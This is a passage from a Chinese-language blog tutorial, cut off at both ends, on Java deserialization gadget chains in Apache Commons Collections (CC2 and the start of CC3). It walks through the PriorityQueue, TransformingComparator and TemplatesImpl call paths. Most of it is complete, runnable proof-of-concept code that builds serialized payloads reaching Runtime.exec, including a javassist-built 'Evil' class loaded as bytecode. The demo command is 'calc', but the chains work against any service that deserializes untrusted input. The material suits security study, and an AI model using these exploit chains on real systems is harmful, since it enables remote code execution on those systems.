expMap.put(tiedmapentry,&quot;valuevalue&quot;);        serialize(expMap);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>版本：commons-collections4: 4.0</p><p>jdk:1.7或1.8低版本</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;      &lt;version&gt;4.0&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>经过测试，上面CC1中的那两条链子还是存在的，但是需要修改一下，因为这个cc版本的LazyMap类变了，给构造函数传参的方式变了</p><p>只有修改LazyMap部分即可</p><p>修改后的poc:</p><p>&lt;8u71</p><pre><code class="java">package org.example;import org.apache.commons.collections4.*;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class App&#123;    public static &lt;K,V&gt; void main(String[] args ) throws IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap();        LazyMap&lt;K, V&gt; lazymap = LazyMap.lazyMap(map, chainedTransformer);//        lazyMap.get(&#39;s&#39;);//实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazymap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法//        proxyMap.size();        // 再实例化一个 AnnotationInvocationHandler 包裹的代理对象 proxyMap        handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);        serialize(handler);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p>8u71</p><pre><code class="java">package org.example;import org.apache.commons.collections4.*;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import java.io.*;import java.util.HashMap;import java.util.Map;public class App&#123;    public static &lt;K,V&gt; void main(String[] args ) throws IOException, ClassNotFoundException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap();        LazyMap&lt;K, V&gt; lazymap = LazyMap.lazyMap(map, chainedTransformer);//        lazyMap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();        Map expMap=new HashMap();        expMap.put(tiedmapentry,&quot;valuevalue&quot;);        serialize(expMap);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p>下面是全新的链子：</p><p>首先<code>chainedTransformer</code>类获取Runtime.getRuntime.exec是和前面的一样的，这里就不再分析了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;    new ConstantTransformer(Class.class),    new InvokerTransformer(        &quot;forName&quot;,        new Class[] &#123;String.class&#125;,        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;    ),    new InvokerTransformer(        &quot;getMethod&quot;,        new Class[] &#123;String.class,Class[].class&#125;,        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;    ),    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;        Object.class, Object[].class &#125;, new Object[] &#123;        null, new Object[0] &#125;),    new InvokerTransformer(        &quot;exec&quot;,        new Class[] &#123;String.class&#125;,        new String[]&#123;&quot;calc&quot;&#125;    )&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(&#39;s&#39;);</code></pre><h3 id="TransformingComparator版本"><a href="#TransformingComparator版本" class="headerlink" title="TransformingComparator版本"></a>TransformingComparator版本</h3><p>下一步是找一个调用了<code>transform</code>的方法</p><p>在<code>org.apache.commons.collections4.comparators.TransformingComparator</code>这个类中</p><pre><code class="java">public int compare(final I obj1, final I obj2) &#123;    final O value1 = this.transformer.transform(obj1);    final O value2 = this.transformer.transform(obj2);    return this.decorated.compare(value1, value2);&#125;</code></pre><p>this.transformer是由构造函数赋值：</p><pre><code class="java">public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,                              final Comparator&lt;O&gt; decorated) &#123;    this.decorated = decorated;    this.transformer = transformer;&#125;</code></pre><p>目前构造的poc:因为compare中调用了两次<code>transform</code>,所以会执行两次命令</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;    new ConstantTransformer(Class.class),    new InvokerTransformer(        &quot;forName&quot;,        new Class[] &#123;String.class&#125;,        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;    ),    new InvokerTransformer(        &quot;getMethod&quot;,        new Class[] &#123;String.class,Class[].class&#125;,        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;    ),    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;        Object.class, Object[].class &#125;, new Object[] &#123;        null, new Object[0] &#125;),    new InvokerTransformer(        &quot;exec&quot;,        new Class[] &#123;String.class&#125;,        new String[]&#123;&quot;calc&quot;&#125;    )&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(chainedTransformer,null);transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);</code></pre><p>下一步就是寻找哪里调用了compare方法，然后找到<code>java.util.PriorityQueue</code></p><pre><code class="java">private void siftUpUsingComparator(int k, E x) &#123;        while (k &gt; 0) &#123;            int parent = (k - 1) &gt;&gt;&gt; 1;            Object e = queue[parent];            if (comparator.compare(x, (E) e) &gt;= 0)                break;            queue[k] = e;            k = parent;        &#125;        queue[k] = x;    &#125;private void siftDownUsingComparator(int k, E x) &#123;        int half = size &gt;&gt;&gt; 1;        while (k &lt; half) &#123;            int child = (k &lt;&lt; 1) + 1;            Object c = queue[child];            int right = child + 1;            if (right &lt; size &amp;&amp;                comparator.compare((E) c, (E) queue[right]) &gt; 0)                c = queue[child = right];            if (comparator.compare(x, (E) c) &lt;= 0)                break;            queue[k] = c;            k = child;        &#125;        queue[k] = x;    &#125;</code></pre><p>这里的两个方法的if语句中调用了<code>compare</code>方法，但是这些方法是<code>private</code>类型的，不能直接调用，找到这类中调用这个方法的方法</p><pre><code class="java">private void siftUp(int k, E x) &#123;        if (comparator != null)            siftUpUsingComparator(k, x);        else            siftUpComparable(k, x);    &#125;private void siftDown(int k, E x) &#123;        if (comparator != null)            siftDownUsingComparator(k, x);        else            siftDownComparable(k, x);    &#125;</code></pre><p>这个<code>comparator</code>属性不为空则调用<code>siftUpUsingComparator</code>或<code>siftDownUsingComparator</code>,但是这两个还是<code>private</code>类型的，进行往上查找</p><p>找到offer()方法,需要i&gt;&#x3D;1才能调用siftUp(),这里的i是PriorityQueue队列长度，然后还找到了add()方法调用了offer()</p><pre><code class="java">public boolean offer(E e) &#123;        if (e == null)            throw new NullPointerException();        modCount++;        int i = size;        if (i &gt;= queue.length)            grow(i + 1);        size = i + 1;        if (i == 0)            queue[0] = e;        else            siftUp(i, e);        return true;    &#125;public boolean add(E e) &#123;        return offer(e);    &#125;</code></pre><p>那么现在的思路是</p><pre><code>add()-&gt;offer()-&gt;siftUp() -&gt; siftUpComparable()</code></pre><p>修改一下poc即可进行命令执行</p><pre><code class="java">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(chainedTransformer,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);PriorityQueue queue = new PriorityQueue(2,transformingComparator);queue.add(1);queue.add(2);</code></pre><p>至于siftDown()方法,这里找到的是</p><pre><code class="java">private void heapify() &#123;        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)            siftDown(i, (E) queue[i]);    &#125;</code></pre><p>size &gt;&gt;&gt; 1这里表示右移一位即相当于除二，所以size最小为2，即队列大小为二</p><p>继续往上找,找到了<code>readObject</code></p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException &#123;        // Read in size, and any hidden stuff        s.defaultReadObject();        // Read in (and discard) array length        s.readInt();        queue = new Object[size];        // Read in all elements.        for (int i = 0; i &lt; size; i++)            queue[i] = s.readObject();        // Elements are guaranteed to be in &quot;proper order&quot;, but the        // spec has never explained what that might be.        heapify();    &#125;</code></pre><p>找到这里就可以结束这条链子了</p><p>利用链如下：</p><pre class="mermaid">graph TBA("java.util.PriorityQueue#\nreadObject()") --> B("java.util.PriorityQueue#\nheapify()")B("java.util.PriorityQueue#\nheapify()")--> C("java.util.PriorityQueue#\nsiftDown()")C("java.util.PriorityQueue#\nsiftDown()")-->D("java.util.PriorityQueue#\nsiftDownUsingComparator()")D("java.util.PriorityQueue#\nsiftDownUsingComparator()")-->E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")-->F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")F("org.apache.commons.collections4.functors.ChainedTransformer#\ntransform()")-->G("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")G("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections4.functors.ConstantTransformer#\ntransform()")-->H("Runtime.getRuntime.exec('calc')")</pre><p>最终POC如下：</p><pre><code class="java">package org.example;import org.apache.commons.collections4.*;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.util.PriorityQueue;import org.apache.commons.collections4.comparators.TransformingComparator;public class App&#123;    public static void main(String[] args ) throws IOException, ClassNotFoundException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        TransformingComparator transformingComparator= new TransformingComparator&lt;&gt;(chainedTransformer,null);//        transformingComparator.compare(&quot;1&quot;,&quot;2&quot;);        PriorityQueue queue = new PriorityQueue(2,transformingComparator);        queue.add(1);        queue.add(2);        serialize(queue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="TemplatesImpl版本"><a href="#TemplatesImpl版本" class="headerlink" title="TemplatesImpl版本"></a>TemplatesImpl版本</h3><p>在这个版本中使用的是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类的<code>defineTransletClasses()</code>方法</p><pre><code class="java">private void defineTransletClasses()        throws TransformerConfigurationException &#123;...     TransletClassLoader loader = (TransletClassLoader)            AccessController.doPrivileged(new PrivilegedAction() &#123;                public Object run() &#123;                    return new TransletClassLoader(ObjectFactory.findClassLoader());                &#125;            &#125;);        try &#123;            final int classCount = _bytecodes.length;            _class = new Class[classCount];            if (classCount &gt; 1) &#123;                _auxClasses = new Hashtable();            &#125;            for (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();                // Check if this is the main class                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;                    _transletIndex = i;                &#125;                else &#123;                    _auxClasses.put(_class[i].getName(), _class[i]);                &#125;            &#125;...    &#125;</code></pre><p>这个方法会创建一个长度为<code>_bytecodes.length</code>的数组<code>_class</code>，然后循环遍历每个转换类的字节码，并通过<code>loader.defineClass(_bytecodes[i])</code>方法将字节码转换为实际的<code>Class</code>对象</p><p>如果<code>_bytecodes</code>保存的是恶意的字节码，那这里就可以获得一个恶意的Class对象</p><p>其中<code>_bytecodes</code>可以通过构造函数获取，但是这个是protected类型的，不能直接调用，为了不那么麻烦，可以考虑通过反射修改属性的值了</p><pre><code class="java">protected TemplatesImpl(byte[][] bytecodes, String transletName,        Properties outputProperties, int indentNumber,        TransformerFactoryImpl tfactory)    &#123;        _bytecodes = bytecodes;        init(transletName, outputProperties, indentNumber, tfactory);    &#125;</code></pre><p>通过反射修改属性的值:</p><pre><code class="java">TemplatesImpl tmpl = new TemplatesImpl();Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);</code></pre><p>如何获取恶意的bytes?</p><p>使用<code>javasist</code>创建恶意类，转换成<code>bytes</code>,然后使用ClassLoader进行加载测试</p><pre><code class="java">ClassPool pool = ClassPool.getDefault();CtClass Evil = pool.makeClass(&quot;Evil&quot;);Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));String name = &quot;Evil&quot;;Evil.setName(name);String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;CtConstructor constructor = Evil.makeClassInitializer();constructor.insertBefore(cmd);byte[] bytes =Evil.toBytecode();Evil.writeFile(&quot;./&quot;);//测试Class clas = Class.forName(&quot;java.lang.ClassLoader&quot;);Method defineclass = clas.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);defineclass.setAccessible(true);Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length);claz.newInstance();</code></pre><p>其中，第三行是设置这个恶意类继承<code>AbstractTranslet</code>,为什么要这么做呢？</p><p>因为上面提到的<code>defineTransletClasses</code>中，存在if检查,检查这个类的父类是否为<code>ABSTRACT_TRANSLET</code></p><pre><code class="java">for (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();                // Check if this is the main class                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;                    _transletIndex = i;                &#125;                else &#123;                    _auxClasses.put(_class[i].getName(), _class[i]);                &#125;            &#125;</code></pre><pre><code class="java">private static String ABSTRACT_TRANSLET        = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</code></pre><p>目前的poc:</p><pre><code class="java">//构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);</code></pre><p>这里只是获取了恶意的Class,但是还没有进行实例化</p><p>查看在这个类下的<code>getTransletInstance</code>方法</p><pre><code class="java">private Translet getTransletInstance()        throws TransformerConfigurationException &#123;        try &#123;            if (_name == null) return null;            if (_class == null) defineTransletClasses();            // The translet needs to keep a reference to all its auxiliary            // class to prevent the GC from collecting them            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();            translet.postInitialization();            translet.setTemplates(this);            translet.setServicesMechnism(_useServicesMechanism);            translet.setAllowedProtocols(_accessExternalStylesheet);            if (_auxClasses != null) &#123;                translet.setAuxiliaryClasses(_auxClasses);            &#125;            return translet;        &#125;        catch (InstantiationException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;        catch (IllegalAccessException e) &#123;            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);            throw new TransformerConfigurationException(err.toString());        &#125;    &#125;</code></pre><p>在这个方法中，如果属性<code>_name</code>为空直接返回null,需要反射修改这个值如果_class 为空则调用刚刚的<code>defineTransletClasses()</code>，然后后面newInstance()会对<code>_class</code>的内容进行建类的实例，就是获取到这个恶意类的实例，执行恶意类</p><p>所以构造poc需要添加：</p><pre><code class="java">Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);_name.setAccessible(true);_name.set(tmpl,&quot;aaa&quot;);Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);_class.setAccessible(true);_class.set(tmpl,null);</code></pre><p>下一步是查看哪里调用了<code>getTransletInstance</code>,然后就找到了<code>newTransformer</code></p><pre><code class="java">public synchronized Transformer newTransformer()        throws TransformerConfigurationException    &#123;        TransformerImpl transformer;        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,            _indentNumber, _tfactory);        if (_uriResolver != null) &#123;            transformer.setURIResolver(_uriResolver);        &#125;        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;            transformer.setSecureProcessing(true);        &#125;        return transformer;    &#125;</code></pre><p>这个方法是public方法可以直接调用,然后就可以触发前面的链子执行命令了</p><pre><code class="java">tmpl.newTransformer();</code></pre><p>到这里还没有到readObject,继续寻找</p><p>注意看上面的newTransformer方法，它返回一个 <code>Transformer</code> 对象。这很关键</p><p>这里直接使用了前面链子中用到过的<code>InvokerTransformer</code>,这个可以调用任意方法</p><pre><code class="java">InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;,null,null);transformer.transform(tmpl);</code></pre><p>这样就可以代替<code>tmpl.newTransformer()</code>,而且还可以链到CC2第一条链子上(TransformingComparator版本)</p><p>后面的就不详细分析了，上面有</p><p>下一步就是调用到<code>org.apache.commons.collections4.comparators.TransformingComparator#compare()</code></p><pre><code class="java">public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer) &#123;        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);    &#125;public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer,                                  final Comparator&lt;O&gt; decorated) &#123;        this.decorated = decorated;        this.transformer = transformer;    &#125;public int compare(final I obj1, final I obj2) &#123;        final O value1 = this.transformer.transform(obj1);        final O value2 = this.transformer.transform(obj2);        return this.decorated.compare(value1, value2);    &#125;</code></pre><p>所以使用</p><pre><code class="java">TransformingComparator transformingComparator = new TransformingComparator(transformer);transformingComparator.compare(tmpl,tmpl);</code></pre><p>替换<code>transformer.transform(tmpl);</code></p><p>下一步就是找调用<code>compare</code>的地方</p><p><code>java.util.PriorityQueue#siftDownUsingComparator()</code></p><pre><code class="java">private void siftDownUsingComparator(int k, E x) &#123;        int half = size &gt;&gt;&gt; 1;        while (k &lt; half) &#123;            int child = (k &lt;&lt; 1) + 1;            Object c = queue[child];            int right = child + 1;            if (right &lt; size &amp;&amp;                comparator.compare((E) c, (E) queue[right]) &gt; 0)                c = queue[child = right];            if (comparator.compare(x, (E) c) &lt;= 0)                break;            queue[k] = c;            k = child;        &#125;        queue[k] = x;    &#125;</code></pre><p>这里使用第二个<code>compare</code>来触发，毕竟它的参数<code>x</code>是直接来自方法的参数，而且<code>comparator</code>是类属性，可以通过反射修改为<code>transformingComparator</code></p><p>下一步就是看<code>siftDown</code></p><pre><code class="java">private void siftDown(int k, E x) &#123;        if (comparator != null)            siftDownUsingComparator(k, x);        else            siftDownComparable(k, x);    &#125;</code></pre><p>这里需要控制comparator !&#x3D; null，上面已经通过反射修改，不为空</p><p>然后就到了这里<code>heapify</code></p><pre><code class="java">private void heapify() &#123;    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)        siftDown(i, (E) queue[i]);&#125;</code></pre><p>这里需要注意一下我们需要控制的参数变成了<code>queue[i]</code>,这个queue是这个类的属性，可以通过反射修改</p><p>还有size &gt;&gt;&gt; 1这里表示右移一位即相当于除二，所以size最小为2,可以通过添加队列元素控制，也可以通过反射控制</p><p>然后就来到了这个类的<code>readObject</code></p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException &#123;        // Read in size, and any hidden stuff        s.defaultReadObject();        // Read in (and discard) array length        s.readInt();        queue = new Object[size];        // Read in all elements.        for (int i = 0; i &lt; size; i++)            queue[i] = s.readObject();        // Elements are guaranteed to be in &quot;proper order&quot;, but the        // spec has never explained what that might be.        heapify();    &#125;</code></pre><p>整个调用链：</p><pre class="mermaid">graph TBA("java.util.PriorityQueue#\nreadObject()") --> B("java.util.PriorityQueue#\nheapify()")B("java.util.PriorityQueue#\nheapify()")--> C("java.util.PriorityQueue#\nsiftDown()")C("java.util.PriorityQueue#\nsiftDown()")-->D("java.util.PriorityQueue#\nsiftDownUsingComparator()")D("java.util.PriorityQueue#\nsiftDownUsingComparator()")-->E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")E("org.apache.commons.collections4.comparators.TransformingComparator#\ncompare()")-->F("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()")F("org.apache.commons.collections4.functors.InvokerTransformer#\ntransform()")-->G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")G("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()")-->H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")H("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()")-->I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")I("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()")-->J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")J("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()")-->K("Runtime.getRuntime.exec")</pre><p>最终POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.Field;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import java.util.PriorityQueue;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class App&#123;    public static void main(String[] args ) throws IOException, NotFoundException, CannotCompileException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;,null,null);//        transformer.transform(tmpl);        TransformingComparator transformingComparator = new TransformingComparator(transformer);//        transformingComparator.compare(tmpl,tmpl);        PriorityQueue queue = new PriorityQueue(2);        queue.add(1);        queue.add(2);        Field comparator_field = queue.getClass().getDeclaredField(&quot;comparator&quot;);        comparator_field.setAccessible(true);        comparator_field.set(queue,transformingComparator);        Field queue_ = queue.getClass().getDeclaredField(&quot;queue&quot;);        queue_.setAccessible(true);        queue_.set(queue, new Object[]&#123;tmpl,1&#125;);        serialize(queue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>条件：commons-collections: 3.1～3.2.1</p><p>jdk： &lt;7u21或jdk8低版本</p><p>环境：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>这个条链子可以说是CC1和CC2的结合，前半部分是CC2的后半部分是CC1的</p><p>下面是前半部分的，就是上面CC2种javassist写入恶意字节码部分，这里就不分析了</p><pre><code class="java">//构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = 